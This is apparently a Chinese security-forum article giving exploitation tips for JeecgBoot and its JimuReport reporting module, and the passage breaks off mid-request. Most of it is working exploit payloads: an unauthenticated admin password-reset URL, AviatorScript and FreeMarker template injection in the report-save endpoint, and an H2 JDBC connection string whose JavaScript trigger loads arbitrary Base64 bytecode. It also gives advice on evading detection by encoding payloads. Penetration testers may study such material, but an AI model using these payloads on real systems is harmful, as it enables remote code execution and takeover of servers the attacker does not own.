# 关于JeecgBoot漏洞利用Tips-先知社区

> **来源**: https://xz.aliyun.com/news/19197  
> **文章ID**: 19197

---

# JeecgBoot漏洞利用的Tips

**Ha1ey@深蓝攻防实验室**

**本文章仅供学习交流使用，文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！**

# 前言

想必大家最近遇到了很多Jeecg-Boot二开的系统，网上公开的工具通常都是exp一把梭，这里分享一下之前在不同实战环境中遇到的以及解决方法。

# 常见漏洞POC

下面简单看一下比较常见的几个POC

## 重置admin密码

如果没有用户的权限情况下，可以尝试恢复admin密码，但是成功率很低，很多被修复。。。。

```
/sys/user/passwordChange?username=admin&password=admin&smscode=&phone=
```

## 积木报表的AviatorScript 表达式注入

该接口在部分版本是有freemarker模板注入的，傻傻分不清楚。。。

```
POST /jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 3456


{
    "loopBlockList": [],
    "area": false,
    "printElWidth": 718,
    "excel_config_id": "33333333",
    "printElHeight": 1047,
    "rows": {
        "4": {
            "cells": {
                "4": {
                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('ClassName', Base64Utils.decodeFromString('yv66xxxxxxx'), ClassLoader.getSystemClassLoader());)",
                    "style": 0
                }
            },
            "height": 25
        },
        "len": 96,
        "-1": {
            "cells": {
                "-1": {
                    "text": "${gongsi.id}"
                }
            },
            "isDrag": true
        }
    },
    "dbexps": [],
    "toolPrintSizeObj": {
        "printType": "A4",
        "widthPx": 718,
        "heightPx": 1047
    },
    "dicts": [],
    "freeze": "A1",
    "dataRectWidth": 701,
    "background": false,
    "name": "sheet1",
    "autofilter": {},
    "styles": [
        {
            "align": "center"
        }
    ],
    "validations": [],
    "cols": {
        "4": {
            "width": 95
        },
        "len": 50
    },
    "merges": [
        "E4:F4",
        "B4:B5",
        "C4:C5",
        "D4:D5",
        "G4:G5",
        "H4:H5",
        "I4:I5",
        "D1:G1",
        "H3:I3"
    ]
}
```

```
POST /jeecgboot/jmreport/save HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Access-Token: 
Connection: close
Content-Type: application/json
Content-Length: 26067

{"excel_config_id":"33333333","chartList":[{"row":6,"col":1,"width":"302","height":"337","config":"{"yAxis":{"axisLabel":{"rotate":0,"interval":0,"textStyle":{"color":"#FFFFFF","fontSize":"10"}},"data":["江苏","山东","安徽","江西","河北","吉林","黑龙江","重庆","广东","上海","哈尔滨","福建","四川"],"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type":"category"},"xAxis":{"axisLabel":{"textStyle":{"color":"#333","fontSize":12}},"axisLine":{"lineStyle":{"color":"#333"}},"show":false,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type ":"value"},"legend":{"padding":[25,20,25,10],"data":["销售额"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"grid":{"top":20,"left":45,"bottom":16,"right":46},"series":[{"barWidth":13,"data":[100,800,1200,1700,2500,4000,5800,6500,7000,7500,8000,8800,9500],"name":"销售额","itemStyle":{"barBorderRadius":5,"color":"rgba(67,184,251,1)"},"label":{"show":true,"position":"right","textStyle":{"color":"#689AFB","fontSize":"10","fontWeight":"normal"}},"type":"bar","barMinHeight":2,"typeData":[],"textStyle":{"color":"black","fontWeight":"bolder"}}],"tooltip":{"show":true,"axisPointer":{"type":"shadow"},"trigger":"axis","textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"销售额省份排名","textStyle":{"color":"#FFFFFF","fontWeight":"normal","fontSize":"14"},"left":"left","padding":[5,20,5,20]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339491107951640577","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"xiaoshoue","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"bar.multi.horizontal","chartId":"pie.doughnut"},"layer_id":"IFj1lg5S5aNG1wPx","offsetX":0,"offsetY":0,"virtualCellRange":[[6,1],[6,2],[6,3],[6,4]]},{"row":6,"col":10,"width":"247","height":"124","config":"{"legend":{"padding":[25,20,25,10],"data":["销售额","其他"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"series":[{"isRose":false,"data":[{"name":"销售额","value":6000000,"itemStyle":{"color":"rgba(43,193,254,1)"}},{"name":"其他","value":3400879,"itemStyle":{"color":"rgba(42,45,76,0.59)"}}],"isRadius":true,"roseType":"","notCount":false,"name":"访问来源","minAngle":0,"label":{"show":false,"position":"outside","textStyle":{"color":"","fontSize":16,"fontWeight":"bolder"}},"type":"pie","radius":["45%","55%"],"autoSort":false}],"tooltip":{"formatter":"{b} : {c}","show":true,"textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"销售进度","textStyle":{"color":"#FFFFFF","fontWeight":"normal","fontSize":"14"},"left":"left","padding":[5,20,5,10]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339498906765000705","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"xsjd","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"pie.doughnut","chartId":"pie.doughnut"},"layer_id":"Yb2TIGEAxnvN9ITx","offsetX":0,"offsetY":0,"virtualCellRange":[[6,10],[6,11]]},{"row":6,"col":12,"width":"244","height":"128","config":"{"yAxis":{"axisLabel":{"rotate":0,"interval":0,"textStyle":{"color":"#FFFFFF","fontSize":"10"}},"data":["北京","青岛","合肥","深圳","石家庄","重庆","保定","邯郸"],"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type":"category"},"xAxis":{"axisLabel":{"textStyle":{"color":"#333","fontSize":12}},"axisLine":{"lineStyle":{"color":"#333"}},"show":false,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type ":"value"},"legend":{"padding":[25,20,25,10],"data":["销售额"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"grid":{"top":10,"left":49,"bottom":16,"right":45},"series":[{"barWidth":9,"data":[80,500,800,1000,1200,1500,1600,2000],"name":"销售额","itemStyle":{"barBorderRadius":0,"color":"rgba(146,119,252,1)"},"label":{"show":true,"position":"right","textStyle":{"color":"#689AFB","fontSize":"10","fontWeight":"normal"}},"type":"bar","barMinHeight":2,"typeData":[],"textStyle":{"color":"black","fontWeight":"bolder"}}],"tooltip":{"show":true,"axisPointer":{"type":"shadow"},"trigger":"axis","textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"销售额城市排名","textStyle":{"color":"#FFFFFF","fontWeight":"normal","fontSize":"14"},"left":"left","padding":[5,20,5,20]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339495346077728770","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"chengshi","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"bar.multi.horizontal","chartId":"bar.multi.horizontal"},"layer_id":"qQHpevWlqElpRQUl","offsetX":0,"offsetY":0,"virtualCellRange":[[6,12],[6,13],[6,14]]},{"row":6,"col":15,"width":"230","height":"127","config":"{"yAxis":{"axisLabel":{"rotate":0,"interval":0,"textStyle":{"color":"#FFFFFF","fontSize":"10"}},"data":["北京","青岛","合肥","深圳","石家庄","重庆","保定","邯郸"],"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type":"category"},"xAxis":{"axisLabel":{"textStyle":{"color":"#333","fontSize":12}},"axisLine":{"lineStyle":{"color":"#333"}},"show":false,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type ":"value"},"legend":{"padding":[25,20,25,10],"data":["销售额"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"grid":{"top":10,"left":49,"bottom":20,"right":48},"series":[{"barWidth":9,"data":[80,500,800,1000,1200,1500,1600,2000],"name":"销售额","itemStyle":{"barBorderRadius":0,"color":"rgba(146,119,252,1)"},"label":{"show":true,"position":"right","textStyle":{"color":"#689AFB","fontSize":"10","fontWeight":"normal"}},"type":"bar","barMinHeight":2,"typeData":[],"textStyle":{"color":"black","fontWeight":"bolder"}}],"tooltip":{"show":true,"axisPointer":{"type":"shadow"},"trigger":"axis","textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"某站点用户访问来源","textStyle":{"color":"#c23531","fontWeight":"bolder","fontSize":18},"left":"left","padding":[5,20,5,20]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339495346077728770","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"chengshi","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"bar.multi.horizontal","chartId":"bar.multi.horizontal"},"layer_id":"phTmhkjHLebYlOEQ","offsetX":0,"offsetY":0,"virtualCellRange":[[6,15],[6,16],[6,17],[6,18]]},{"row":7,"col":5,"width":"430","height":"293","config":"{"geo":{"map":"china","zoom":0.5,"label":{"color":"#FFFFFF","fontSize":"8","show":true},"itemStyle":{"borderWidth":0.5,"areaColor":"#8284FB","borderColor":"#000"},"emphasis":{"label":{"color":"#fff"},"itemStyle":{"areaColor":"#4195EF"}},"regions":[],"layoutSize":600,"roam":true,"layoutCenter":["50%","50%"]},"series":[{"encode":{"value":[2]},"data":[{"name":"河北","value":[114.502461,38.045474,279]},{"name":"海南","value":[110.33119,20.031971,273]},{"name":"山东","value":[117.000923,36.675807,229]},{"name":"甘肃","value":[103.823557,36.058039,194]},{"name":"宁夏","value":[106.278179,38.46637,193]},{"name":"浙江","value":[120.153576,30.287459,177]},{"name":"湖南","value":[112.982279,28.19409,119]},{"name":"湖北","value":[114.298572,30.584355,79]},{"name":"河南","value":[113.665412,34.757975,67]},{"name":"北京","value":[116.405285,39.904989,58]},{"name":"天津","value":[117.190182,39.125596,59]},{"name":"上海","value":[121.472644,31.231706,63]}],"name":"","emphasis":{"label":{"show":true}},"itemStyle":{"color":"#FF1205"},"coordinateSystem":"geo","label":{"formatter":"{b}","show":false,"position":"right"},"type":"scatter","symbolSize":5}],"chartType":"map","tooltip":{"show":true,"textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"主要城市空气质量","textStyle":{"color":"#c23531","fontWeight":"normal","fontSize":"14"},"left":"left","padding":[5,20,5,10]}}","url":"","extData":{"chartType":"map.scatter"},"layer_id":"YTri6J59av4gj1CY","offsetX":0,"offsetY":0,"virtualCellRange":[[7,5],[7,6],[7,7],[7,8]]},{"row":14,"col":12,"width":"244","height":"138","config":"{"legend":{"padding":[25,20,25,10],"data":["销售额","其他"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"series":[{"isRose":false,"data":[{"name":"销售额","value":6000000,"itemStyle":{"color":"rgba(43,193,254,1)"}},{"name":"其他","value":3400879,"itemStyle":{"color":"rgba(42,45,76,0.59)"}}],"isRadius":true,"roseType":"","notCount":false,"name":"访问来源","minAngle":0,"label":{"show":false,"position":"outside","textStyle":{"color":"","fontSize":16,"fontWeight":"bolder"}},"type":"pie","radius":["50%","60%"],"autoSort":false}],"tooltip":{"formatter":"{b} : {c}","show":true,"textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"","textStyle":{"color":"#c23531","fontWeight":"bolder","fontSize":18},"left":"left","padding":[5,20,5,10]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339498906765000705","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"xsjd","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"pie.doughnut","chartId":"pie.doughnut"},"layer_id":"ARuuHLfjqV9l1tQD","offsetX":0,"offsetY":0,"virtualCellRange":[[14,12],[14,13],[14,14]]},{"row":14,"col":15,"width":"230","height":"139","config":"{"legend":{"padding":[25,20,25,10],"data":["销售额","其他"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"series":[{"isRose":false,"data":[{"name":"销售额","value":6000000,"itemStyle":{"color":"rgba(43,193,254,1)"}},{"name":"其他","value":3400879,"itemStyle":{"color":"rgba(42,45,76,0.59)"}}],"isRadius":true,"roseType":"","notCount":false,"name":"访问来源","minAngle":0,"label":{"show":false,"position":"outside","textStyle":{"color":"","fontSize":16,"fontWeight":"bolder"}},"type":"pie","radius":["45%","55%"],"autoSort":false}],"tooltip":{"formatter":"{b} : {c}","show":true,"textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"某站点用户访问来源","textStyle":{"color":"#c23531","fontWeight":"bolder","fontSize":18},"left":"left","padding":[5,20,5,10]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339498906765000705","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"xsjd","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"pie.doughnut","chartId":""},"layer_id":"bcrMtWqTd2AJIjLd","offsetX":0,"offsetY":0,"virtualCellRange":[[14,15],[14,16],[14,17],[14,18]]},{"row":14,"col":10,"width":"244","height":"138","config":"{"yAxis":{"axisLabel":{"rotate":0,"interval":0,"textStyle":{"color":"#FFFFFF","fontSize":"10"}},"data":["北京","青岛","合肥","深圳","石家庄","重庆","保定","邯郸"],"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type":"category"},"xAxis":{"axisLabel":{"textStyle":{"color":"#333","fontSize":12}},"axisLine":{"lineStyle":{"color":"#333"}},"show":false,"splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false},"type ":"value"},"legend":{"padding":[25,20,25,10],"data":["销售额"],"top":"top","orient":"horizontal","left":"center","show":false,"textStyle":{"color":"#333","fontSize":12}},"grid":{"top":10,"left":49,"bottom":15,"right":45},"series":[{"barWidth":9,"data":[80,500,800,1000,1200,1500,1600,2000],"name":"销售额","itemStyle":{"barBorderRadius":0,"color":"rgba(146,119,252,1)"},"label":{"show":true,"position":"right","textStyle":{"color":"#698AFB","fontSize":"10","fontWeight":"normal"}},"type":"bar","barMinHeight":2,"typeData":[],"textStyle":{"color":"black","fontWeight":"bolder"}}],"tooltip":{"show":true,"axisPointer":{"type":"shadow"},"trigger":"axis","textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":false,"top":5,"text":"某站点用户访问来源","textStyle":{"color":"#c23531","fontWeight":"bolder","fontSize":18},"left":"left","padding":[5,20,5,20]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339495346077728770","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"chengshi","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"bar.multi.horizontal","chartId":"bar.multi.horizontal"},"layer_id":"Y1kgYOWBHIVQdSN5","offsetX":0,"offsetY":0,"virtualCellRange":[[14,10],[14,11]]},{"row":20,"col":1,"width":"743","height":"150","config":"{"yAxis":{"axisLabel":{"textStyle":{"color":"#FFFFFF","fontSize":"10"}},"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"name":"","splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false}},"xAxis":{"axisLabel":{"rotate":0,"interval":0,"textStyle":{"color":"#FEFEFE","fontSize":"10"}},"data":["2020-01-09","2020-01-12","2020-01-14","2020-01-16","2020-01-18"],"axisLine":{"lineStyle":{"color":"#FFFFFF"}},"show":true,"name":"","splitLine":{"lineStyle":{"color":"red","width":1,"type":"solid"},"show":false}},"grid":{"top":53,"left":22,"bottom":37,"right":20},"series":[{"areaStyle":{"color":"#43B8FB","opacity":0.7},"data":[2,6,7,5,6],"showSymbol":true,"lineStyle":{"width":2},"symbolSize":5,"isArea":true,"name":"销量","itemStyle":{"color":"#43B8FB"},"step":false,"label":{"show":false,"position":"top","textStyle":{"color":"black","fontSize":16,"fontWeight":"bolder"}},"type":"line","smooth":false}],"tooltip":{"formatter":"{b} : {c}","show":true,"textStyle":{"color":"#fff","fontSize":"10"}},"title":{"show":true,"top":14,"text":"销售额增速","textStyle":{"color":"#FFFFFF","fontWeight":"normal","fontSize":"14"},"left":"left","padding":[5,20,5,10]}}","url":"","extData":{"dataType":"api","apiStatus":"1","dataId":"1339538388453195777","axisX":"name","axisY":"value","series":"type","yText":"","xText":"","dbCode":"zhexian","dataId1":"","source":"","target":"","isTiming":true,"intervalTime":"5","chartType":"line.area","chartId":""},"layer_id":"uChrZaHYoV04MQpT","offsetX":0,"offsetY":0,"virtualCellRange":[[20,1],[20,2],[20,3],[20,4],[20,5],[20,6],[20,7],[20,8],[20,9]]}],"area":{"sri":4,"sci":5,"eri":4,"eci":5,"width":105,"height":38},"printElWidth":1800,"printElHeight":1047,"rows":{"0":{"cells":{}},"2":{"cells":{"1":{"merge":[0,17],"text":"<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("calc") } ${param.a}","style":3}}},"3":{"cells":{},"height":35},"4":{"cells":{"1":{"text":"  销售额省份排名","style":32,"merge":[0,1],"virtual":"IFj1lg5S5aNG1wPx"},"2":{"style":32,"virtual":"IFj1lg5S5aNG1wPx"},"5":{"text":"  销售总额","style":69},"10":{"text":"  销售进度","style":43},"11":{"text":"","style":43},"13":{"text":"  销售额城市排名","style":32,"merge":[0,1]},"14":{"style":32},"15":{"text":"  个人业绩排名","style":32,"merge":[0,1]},"16":{"style":32},"17":{"text":"","style":32,"merge":[0,1]},"18":{"style":32}},"height":38},"5":{"cells":{"1":{"text":"   Sales ranking points","virtual":"IFj1lg5S5aNG1wPx","style":62,"merge":[0,1]},"2":{"style":31},"5":{"text":"12436025","style":52,"merge":[1,0]},"6":{"merge":[1,0],"text":"元","style":22},"10":{"text":"   Sales progress","style":33},"11":{"text":"","virtual":"Yb2TIGEAxnvN9ITx","style":33},"13":{"text":"   Sales ranking","virtual":"qQHpevWlqElpRQUl","style":31},"14":{"style":32},"15":{"text":"   Personal  ranking","style":62,"merge":[0,1]},"16":{"style":62},"17":{"text":"","style":62,"merge":[0,1]},"18":{"style":62}},"height":24},"6":{"cells":{"1":{"text":"","merge":[0,1],"style":31,"virtual":"IFj1lg5S5aNG1wPx"},"2":{"style":31,"virtual":"IFj1lg5S5aNG1wPx"},"3":{"text":" ","virtual":"IFj1lg5S5aNG1wPx"},"4":{"text":" ","virtual":"IFj1lg5S5aNG1wPx"},"5":{"style":53},"6":{"style":22},"10":{"text":" ","virtual":"Yb2TIGEAxnvN9ITx"},"11":{"text":"","style":33,"virtual":"Yb2TIGEAxnvN9ITx"},"12":{"text":" ","virtual":"qQHpevWlqElpRQUl"},"13":{"text":"","virtual":"qQHpevWlqElpRQUl","style":31},"14":{"text":" ","virtual":"qQHpevWlqElpRQUl"},"15":{"text":" ","virtual":"phTmhkjHLebYlOEQ"},"16":{"text":" ","virtual":"phTmhkjHLebYlOEQ"},"17":{"text":" ","style":31,"virtual":"phTmhkjHLebYlOEQ"},"18":{"text":" ","virtual":"phTmhkjHLebYlOEQ"}}},"7":{"cells":{"5":{"style":53,"virtual":"YTri6J59av4gj1CY"},"6":{"style":22,"virtual":"YTri6J59av4gj1CY"},"7":{"text":" ","virtual":"YTri6J59av4gj1CY"},"8":{"text":" ","virtual":"YTri6J59av4gj1CY"}}},"8":{"cells":{"5":{"style":18,"text":"","virtual":"YTri6J59av4gj1CY"}}},"9":{"cells":{"5":{"style":21,"text":""}}},"10":{"cells":{"5":{"text":"","style":17}}},"12":{"cells":{"10":{"text":"  品类销售排名","style":43},"11":{"text":"","style":43},"13":{"text":"  品类销售额占比","style":43,"merge":[0,1]},"14":{"style":54},"15":{"text":"  一季度销售季度","style":43,"merge":[0,1]},"16":{"style":54},"17":{"text":"","style":43,"merge":[0,1]},"18":{"style":54}}},"13":{"cells":{"10":{"text":"   Category Sales  ranking","style":31},"11":{"text":"","style":31},"13":{"text":"   Type of Sales ","style":31},"15":{"text":"   Quarterly sales progree","style":58,"merge":[0,1]},"16":{"style":58},"17":{"text":"","style":58,"merge":[0,1]},"18":{"style":58}}},"14":{"cells":{"10":{"text":" ","virtual":"Y1kgYOWBHIVQdSN5"},"11":{"text":" ","virtual":"Y1kgYOWBHIVQdSN5"},"12":{"text":" ","virtual":"ARuuHLfjqV9l1tQD"},"13":{"text":" ","virtual":"ARuuHLfjqV9l1tQD"},"14":{"text":" ","virtual":"ARuuHLfjqV9l1tQD"},"15":{"text":" ","virtual":"bcrMtWqTd2AJIjLd"},"16":{"text":" ","virtual":"bcrMtWqTd2AJIjLd"},"17":{"text":" ","virtual":"bcrMtWqTd2AJIjLd"},"18":{"text":" ","virtual":"bcrMtWqTd2AJIjLd"}}},"15":{"cells":{},"height":15},"16":{"cells":{"11":{"text":"","style":43},"13":{"text":"","style":43,"merge":[0,1]},"14":{"style":54},"17":{"text":"","style":43,"merge":[0,1]},"18":{"style":54}}},"17":{"cells":{"11":{"text":"","style":31},"13":{"text":"","style":31},"17":{"text":"","merge":[0,1],"style":58},"18":{"style":58}}},"18":{"cells":{}},"20":{"cells":{"1":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"2":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"3":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"4":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"5":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"6":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"7":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"8":{"text":" ","virtual":"uChrZaHYoV04MQpT"},"9":{"text":" ","virtual":"uChrZaHYoV04MQpT"}},"height":39},"22":{"cells":{"10":{"text":"企业经营指标","style":74},"11":{"text":"1201043元","style":73},"13":{"text":"企业经营指标","style":74},"14":{"text":"1201043元","style":73},"16":{"text":"企业经营指标","style":74},"17":{"text":"1201043元","style":73}}},"23":{"cells":{"10":{"text":"企业经营指标1","style":74},"11":{"text":"1201043元","style":73},"13":{"text":"企业经营指标1","style":74},"14":{"text":"1201043元","style":73},"16":{"text":"企业经营指标1","style":74},"17":{"text":"1201043元","style":73}}},"26":{"cells":{},"height":33},"len":100},"dbexps":[],"toolPrintSizeObj":{"printType":"A4","widthPx":794,"heightPx":1047},"dicts":[],"freeze":"A1","dataRectWidth":1584,"background":{"path":"https://static.jeecg.com/designreport/images/bg55_1608205385382.png","repeat":"no-repeat","width":"1525","height":"700"},"name":"sheet1","autofilter":{},"styles":[{"color":"#ffffff"},{"color":"#ffffff","font":{"size":16}},{"color":"#ffffff","font":{"size":16},"align":"center"},{"color":"#ffffff","font":{"size":18},"align":"center"},{"font":{"size":18}},{"color":"#67b1ee"},{"color":"#67b1ee","font":{"size":14}},{"color":"#67b1ee","font":{"size":12}},{"font":{"size":14}},{"font":{"size":18},"bgcolor":"#ffffff"},{"font":{"size":18},"bgcolor":"#ffffff","color":"#ffffff"},{"font":{"size":16},"bgcolor":"#ffffff","color":"#ffffff"},{"color":"#67b1ee","font":{"size":12},"align":"right"},{"font":{"size":16},"bgcolor":"#ffffff","color":"#ffffff","align":"right"},{"color":"#67b1ee","font":{"size":12},"align":"center"},{"font":{"size":16}},{"font":{"size":16},"color":"#fe0000"},{"font":{"size":16},"color":"#fe0000","align":"center"},{"color":"#67b1ee","font":{"size":12},"align":"left"},{"align":"left"},{"align":"left","font":{"size":14}},{"align":"left","font":{"size":14},"color":"#ffffff"},{"font":{"size":14},"color":"#ffffff"},{"font":{"size":12},"color":"#ffffff"},{"font":{"size":12,"bold":true},"color":"#ffffff"},{"font":{"size":12,"bold":false},"color":"#ffffff"},{"font":{"size":11,"bold":false},"color":"#ffffff"},{"font":{"size":8}},{"font":{"size":9}},{"font":{"size":9},"color":"#67b1ee"},{"font":{"size":9},"color":"#67b1ee","valign":"top"},{"font":{"size":8},"color":"#67b1ee","valign":"top"},{"font":{"size":11,"bold":false},"color":"#ffffff","valign":"bottom"},{"font":{"size":8},"color":"#67b1ee"},{"color":"#67b1ee","font":{"size":12},"align":"left","valign":"bottom"},{"align":"left","valign":"bottom"},{"color":"#67b1ee","font":{"size":12},"align":"center","valign":"bottom"},{"align":"center","valign":"bottom"},{"color":"#67b1ee","font":{"size":12},"align":"left","valign":"middle"},{"align":"left","valign":"middle"},{"font":{"size":11}},{"font":{"size":11},"color":"#ffffff"},{"font":{"size":11},"color":"#ffffff","valign":"middle"},{"font":{"size":11},"color":"#ffffff","valign":"bottom"},{"color":"#ffffff","font":{"size":12},"align":"left","valign":"middle"},{"align":"left","valign":"middle","color":"#ffffff"},{"color":"#67b1ee","font":{"size":16}},{"color":"#ffff01","font":{"size":16}},{"color":"#ffffff","font":{"size":11},"align":"left","valign":"middle"},{"color":"#ffffff","font":{"size":14},"align":"left","valign":"middle"},{"color":"#ffff01","font":{"size":14},"align":"left","valign":"middle"},{"font":{"size":14},"color":"#ffff01"},{"color":"#ffff01","font":{"size":14},"align":"right","valign":"middle"},{"font":{"size":14},"color":"#ffff01","align":"right"},{"color":"#ffffff","valign":"bottom"},{"font":{"size":8},"bgcolor":"#67b1ee"},{"font":{"size":8},"bgcolor":"#ffffff"},{"font":{"size":8},"bgcolor":"#ffffff","color":"#67b1ee"},{"font":{"size":8},"bgcolor":"#ffffff","color":"#67b1ee","valign":"top"},{"font":{"size":8,"bold":false},"color":"#ffffff","valign":"bottom"},{"font":{"size":8,"bold":false},"color":"#ffffff","valign":"top"},{"font":{"size":8},"valign":"top"},{"font":{"size":8,"bold":false},"color":"#67b1ee","valign":"top"},{"color":"#ffffff","font":{"size":11},"align":"center","valign":"middle"},{"align":"center"},{"color":"#ffffff","font":{"size":11},"align":"right","valign":"middle"},{"align":"right"},{"color":"#ffffff","font":{"size":14},"align":"right","valign":"middle"},{"align":"right","font":{"size":14}},{"color":"#ffffff","font":{"size":11},"align":"left","valign":"bottom"},{"color":"#67b1ee","font":{"size":11}},{"color":"#67b1ee","font":{"size":11},"align":"center"},{"font":{"size":12}},{"font":{"size":12},"color":"#ffff01"},{"color":"#67b1ee","font":{"size":11},"align":"right"}],"validations":[],"cols":{"0":{"width":10},"3":{"width":102},"4":{"width":9},"5":{"width":105},"6":{"width":102},"8":{"width":124},"9":{"width":14},"10":{"width":136},"11":{"width":114},"12":{"width":15},"13":{"width":113},"14":{"width":129},"15":{"width":11},"len":27},"merges":["B7:C7","N17:O17","R17:S17","R18:S18","B3:S3","R6:S6","B5:C5","B6:C6","F6:F7","G6:G7","N5:O5","R5:S5","N13:O13","R13:S13","R14:S14","P5:Q5","P6:Q6","P14:Q14","P13:Q13"]}
```

## 积木报表的JDBC

这个就比较吃数据库驱动了，如果目标出网可以尝试mysql的，通常依赖都是高版本的

```
/jmreport/testConnection
```

如果目标存在H2 数据库就可以在不出网的情况下去加载JavaScript 造成任意字节码加载，缺点是特征太明显，可以尝试unicode编码等等。。。 如果出网就可以调用lookup等其他可以远程加载的方式组合减少攻击payload特征

```
{"dbType":"H2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER s BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
var classLoader = java.lang.Thread.currentThread().getContextClassLoader()\;try{classLoader.loadClass('ClassName').newInstance()\;}catch (e){var clsString = classLoader.loadClass('java.lang.String')\;var bs64 = 'yv66。。。。。。。。。。'\;var bytecode\;try{var clsBase64 = classLoader.loadClass('java.util.Base64')\;var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder')\;var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz)\;bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bs64)\;} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter')\;bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bs64)\;} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder')\;bytecode = clazz1.newInstance().decodeBuffer(bs64)\;}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader')\;var clsByteArray = (new java.lang.String('a').getBytes().getClass())\;var clsInt = java.lang.Integer.TYPE\;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt])\;defineClass.setAccessible(true)\;var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length))\;clazz.newInstance()\;}$$","dbUsername":"1","dbPassword":"1"}
```

## freemarker模板注入

漏洞接口

```
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
